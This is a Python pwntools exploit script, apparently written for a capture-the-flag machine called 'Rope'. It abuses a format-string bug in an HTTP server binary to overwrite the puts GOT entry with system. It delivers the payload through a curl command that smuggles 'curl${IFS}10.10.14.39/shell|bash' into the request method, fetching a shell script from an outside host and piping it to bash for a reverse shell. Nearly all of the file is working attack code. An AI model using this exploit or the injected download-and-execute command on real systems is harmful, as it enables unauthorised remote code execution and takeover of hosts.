from pwn import *
import sys
import os
if len(sys.argv) < 3:
    print("usage: ./remote.py base libc ip")
    quit()
p = process("./httpserver")
def send_payload(payload):
            print("payload = %s" % repr(payload))
            print("-" * 16)
            print(urlencode(payload))
            print("[*] Sending Request! ")
            ip = str(sys.argv[3])
            command = """curl -i -s -k -X $'curl${IFS}10.10.14.39/shell|bash' \
                                -H $'Host: %s:9999' \
                                                $'http://%s:9999/%s'""" % (ip,ip,urlencode(payload))
            #print(command)
            os.system(command)

format_string = FmtStr(execute_fmt=send_payload,offset=53)
rope_base   =  int(sys.argv[1],16)
puts_offset =  0x5048
local_puts  =  0x5655a048 #just for local testing 
final_puts  =  rope_base + puts_offset
local_system = 0xf7de3a60
rope_libc   =  int(sys.argv[2],16)
system_offset = 0x3cd10
system = rope_libc + system_offset
print("rope-base:  0x%x" % rope_base) 
print("rope-puts:  0x%x" % final_puts)
print("rope-libc:  0x%x" % rope_libc)
print("rope-system 0x%x" % local_system)
format_string.write(final_puts, system)

format_string.execute_writes()


